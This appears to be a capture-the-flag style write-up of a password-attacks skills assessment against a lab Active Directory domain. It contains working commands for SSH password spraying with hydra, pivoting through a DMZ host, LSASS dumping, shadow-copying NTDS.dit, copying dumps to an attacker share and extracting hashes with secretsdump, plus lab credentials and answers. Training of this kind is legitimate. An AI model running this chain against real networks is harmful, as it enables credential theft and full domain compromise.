#  Skills Assessment – Password Attacks

## The Credential Theft Shuffle

The **Credential Theft Shuffle**, a term popularized by Sean Metcalf, outlines a systematic method adversaries use to compromise Active Directory environments through credential abuse. The attack chain typically begins with initial access — often via phishing or exposed services — followed by privilege escalation to obtain local administrator rights. From there, tools like **Mimikatz** are used to extract credentials from memory.

Armed with valid credentials, attackers move laterally across the network using techniques like **Pass-the-Hash (PtH)** and tools such as **NetExec**, seeking out further credential caches and access opportunities. This process often culminates in full **domain dominance**, achieved through actions like **DCSync** attacks or compromising **Domain Admin** accounts.

Mitigation requires a layered defense strategy, including:
- Enforcing **multi-factor authentication**
- Deploying **Local Administrator Password Solution (LAPS)**
- Restricting lateral movement through **network segmentation** and **tiered administration**

## Assessment Overview

Our target organization is **Nexura LLC**, where an employee named **Betty Jayde** is suspected of password reuse across multiple platforms. Intelligence indicates she commonly uses the password:
`Texas123!@#`


We aim to leverage this password to gain initial access and escalate to domain-level privileges.

### In-Scope Hosts

| Host    | IP Address               |
|---------|--------------------------|
| DMZ01   | 10.129.\*.*/172.16.119.13 |
| JUMP01  | 172.16.119.7             |
| FILE01  | 172.16.119.10            |
| DC01    | 172.16.119.11            |

---

## Pivoting Primer

The internal systems (**JUMP01**, **FILE01**, **DC01**) are located on a private subnet and are not directly accessible from the internet. The only externally reachable host is **DMZ01**, which bridges both the external and internal networks — a classic **DMZ** configuration.

To reach internal assets, we must first **compromise DMZ01**, then use it as a **pivot point**. By routing our tools (e.g., proxychains, SOCKS tunnels) through DMZ01, we can interact with the internal network as though we were directly connected.

Once foothold is established on DMZ01, refer to the module cheat sheet or enumeration steps below to continue lateral movement, escalate privileges, and extract credentials to ultimately gain command execution on **DC01**.

## What is the NTLM hash of NEXURA\Administrator?


## Step 1: Target Reconnaissance

We began with a port and service scan of the external IP.

**Command:**
```
nmap -A 10.129.234.116
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```
Only SSH was available, confirming that DMZ01 is a Linux host with no SMB, RDP, or WinRM services exposed.

## Step 2: Password Reuse Attack (Betty Jayde)

Given the known reused password (Texas123!@#), we attempted SSH brute-force against likely usernames using hydra.

```
sudo nano usernames.txt
```

<img width="656" height="251" alt="image" src="https://github.com/user-attachments/assets/de28b6bf-27a0-4157-9ea5-e51d3bdd64c7" />

```
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4 -f
```

<img width="1023" height="460" alt="image" src="https://github.com/user-attachments/assets/31e22c12-2dba-4924-b82c-dfabb5c3c735" />

## Step 3: Gaining Shell Access (Initial Foothold)

With valid SSH credentials, we connected to the DMZ host.

```
ssh betty@10.129.234.116
```
This granted us a foothold on the externally accessible DMZ01 machine.

<img width="1479" height="238" alt="image" src="https://github.com/user-attachments/assets/3672e17d-8e7e-4bbd-ad5f-33560af38180" />


## Step 4: Internal Network Enumeration

Check Internal Interfaces and Routes.

<img width="1023" height="162" alt="image" src="https://github.com/user-attachments/assets/30d9671e-35ea-42f0-811c-5aa09ee9ee61" />
This confirms DMZ01 has a second interface inside the internal network.

## Step 5: Credential Discovery on DMZ01

Checking the user's bash history can often contain commands with credentials.

```
cat .bash_history
```
<img width="762" height="418" alt="image" src="https://github.com/user-attachments/assets/a658c5d7-afcb-4f1d-85f4-8ef80bb51f2e" />


## Step 6: Nmap Scanning Through the Proxy

To scan the internal host DC01 :
```
# Nmap 7.94 scan initiated at 2025-07-31 18:23 UTC
nmap -sT -Pn --open --min-rate 10 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 172.16.119.11

Nmap scan report for 172.16.119.11
Host is up (0.0012s latency).

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldaps
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

# Nmap done: 1 IP address (1 host up) scanned in 2.18 seconds
```
To scan the internal host FILE01:

```
# Nmap 7.94 scan initiated at 2025-07-31 18:25 UTC
nmap -sT -Pn --open --min-rate 10 -p 135,445,3389,5985 172.16.119.10

Nmap scan report for 172.16.119.10
Host is up (0.0011s latency).

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

# Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds

```


## Step 7: Accessing FILE01 SMB with Credentials

<img width="819" height="408" alt="image" src="https://github.com/user-attachments/assets/a27207ef-46d0-4359-be2d-a21392adc287" />

The 'Archive' directory looked like an interesting place to start looking. 
<img width="1526" height="441" alt="image" src="https://github.com/user-attachments/assets/4f5e14d0-8020-4ba9-aaa3-147a1fd19057" />

<img width="1150" height="507" alt="image" src="https://github.com/user-attachments/assets/bd26613d-9b01-4a98-9375-495d612e6a99" />

<img width="1516" height="126" alt="image" src="https://github.com/user-attachments/assets/85daaf74-612e-45dc-99b7-43fd7ea6041e" />


## Step 8: Extracting Hash from File

<img width="875" height="265" alt="image" src="https://github.com/user-attachments/assets/db3389df-3a9d-4e3e-91e1-6663d4643de6" />

```
python3 /usr/share/john/pwsafe2john.py /home/htb-ac-943240/Employee-Passwords_OLD.psafe3 > psafe_hash.txt
```

<img width="1172" height="319" alt="image" src="https://github.com/user-attachments/assets/bbee7069-b061-453a-b406-38bf836f94e6" />


## Step 9: Using Discovered Password to open File

```
sudo apt install passwordsafe
```

```
pwsafe Employee-Passwords_OLD.psafe3
```

<img width="1525" height="510" alt="image" src="https://github.com/user-attachments/assets/548ecb01-756e-4a55-991e-068b57cf010b" />

Right Click each user and copy Username and Password to a clipboard. Copy it over to a notepad of choice: 
<img width="726" height="452" alt="image" src="https://github.com/user-attachments/assets/284daaef-5e9a-42d2-ae36-baa8c3260613" />


<img width="1840" height="703" alt="image" src="https://github.com/user-attachments/assets/010f50dc-4795-40d5-9c40-012a74db43a1" />

| Domain       | Username | Password              |
| ------------ | -------- | --------------------- |
| DMZ01        | jbetty   | xiao-nicer-wheels5    |
| Domain Users | bdavid   | caramel-cigars-reply1 |
| Domain Users | stom     | fails-nibble-disturb4 |
| Domain Users | hwilliam | warned-wobble-occur8  |


## Step 10: RDP to JUMP01 with Stolen Credentials

To access internal services (like RDP) from outside the target network, I used SSH Local Port Forwarding to create a tunnel from my local machine to the internal host.

```
ssh -L 3389:172.16.119.7:3389 jbetty@10.129.234.116
```
This command forwards my local port 3389 to port 3389 on the internal host 172.16.119.7 via the intermediate SSH-accessible machine at 10.129.234.116 (DMZ01). I was then able to initiate an RDP session from my local machine by connecting to 127.0.0.1:3389. After this we can use xfreedrp to initiate an RDP session in JUMP01: 

```
xfreerdp /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb /v:127.0.0.1 /cert:ignore /dynamic-resolution
```

## Step 11: Dumping LSASS from JUMP01 and Extracting Credentials

Locate lsass.exe inside task manager details tab and create a dump file:

<img width="1901" height="727" alt="image" src="https://github.com/user-attachments/assets/c3c33630-98a6-4695-accd-9969a3fef8b2" />

<img width="408" height="203" alt="image" src="https://github.com/user-attachments/assets/c676533b-cfe7-44a5-8321-88a03a0bc55b" />

The dump file needs to be transferred back to our linux machine. Turn on network disovery

<img width="1360" height="727" alt="image" src="https://github.com/user-attachments/assets/3341f197-b758-41d0-96c4-d09949230e7e" />

I was having trouble connecting the shares based on the first RDP session. A new xfreedrp session needs to be rerun, but with mounting
a drive. Here on my attacker machine I created a new share folder called "parrotshare" and ran my new command from that directory.

```
xfreerdp /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb /v:127.0.0.1 /cert:ignore /dynamic-resolution /drive:parrotshare,/home/$(whoami)/parrotshare
```
This will open up a new session but now you will see:

<img width="1281" height="729" alt="image" src="https://github.com/user-attachments/assets/41105b50-405c-4426-b9d5-339cf47e05d0" />

And to confirm I made a hello.txt file from my machine and it can be seen:

<img width="1288" height="722" alt="image" src="https://github.com/user-attachments/assets/fc456889-c17e-4d41-b763-2de120dc38c1" />

Now use the command to move lsass.dmp to parrotshare from the command prompt:

```
move %LOCALAPPDATA%\Temp\lsass.dmp \\tsclient\parrotshare\
```

<img width="1285" height="723" alt="image" src="https://github.com/user-attachments/assets/3fe78523-1709-47cb-a05e-2122d59196ee" />


And back on my machine:

<img width="986" height="158" alt="image" src="https://github.com/user-attachments/assets/bcb6137c-ec27-433d-b160-0f93c0bd27f7" />


## Step 12: Dump LSASS Credentials with pypykatz

```
pypykatz lsa minidump lsass.DMP
```
This successfully extracted credentials in JUMP01's memory. The password for user stom: `calves-warp-learning1` and its  
NTLM hash `21ea958524cfd9a7791737f8d2f764fa`. 


## Step 13: RDP to DC01 with New Domain Credentials

Let's connect again like we did last time but using the newly discovered credentials:

```
xfreerdp /u:stom /p:'calves-warp-learning1' /d:nexura.htb /v:127.0.0.1 /cert:ignore /dynamic-resolution /drive:parrotshare,/home/$(whoami)/parrotshare
```
## Step 14: Created a Volume Shadow Copy of C:Drive

Run PowerShell as Administrator and execute the following command: 

```
vssadmin CREATE SHADOW /for=C:
```
<img width="1072" height="545" alt="image" src="https://github.com/user-attachments/assets/1adc10bf-7d14-4b85-ba2d-4006b36f64ff" />


## Step 15: Copying NTDS.dit and SYSTEM Hive from Shadow Copy


In Powershell we need to copy the NTDS.dit file from its location to an accessible location on the
C: drive :

```
cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
```

<img width="1082" height="103" alt="image" src="https://github.com/user-attachments/assets/2ecbc589-8b4b-4c1f-94c5-cec49e4c1cce" />

Then we need to use reg.exe save to export the SYSTEM registry to the hive: 

<img width="1043" height="77" alt="image" src="https://github.com/user-attachments/assets/0187ffbf-739f-4683-8e15-6d19f2f834b6" />

## Step 16: Copying Files to Share

```
copy C:\NTDS.dit \\tsclient\parrotshare\
copy C:\system.save \\tsclient\parrotshare\
```

<img width="988" height="574" alt="image" src="https://github.com/user-attachments/assets/2893c383-a4a8-424b-8be9-deb0c2b3dc75" />

## Step 17: Final Hash Extraction using secretsdump.py for Administrator NTLM Hash

Using the command: 
```
secretsdump.py -ntds NTDS.dit -system system.save LOCAL
```
<img width="1282" height="549" alt="image" src="https://github.com/user-attachments/assets/2c60a657-b159-4121-8e10-9424c287ddad" />

## Conclusion

This assessment successfully demonstrated credential extraction via shadow copy of NTDS.dit, 
confirming full domain compromise through recovered NTLM hashes, including the Administrator account.






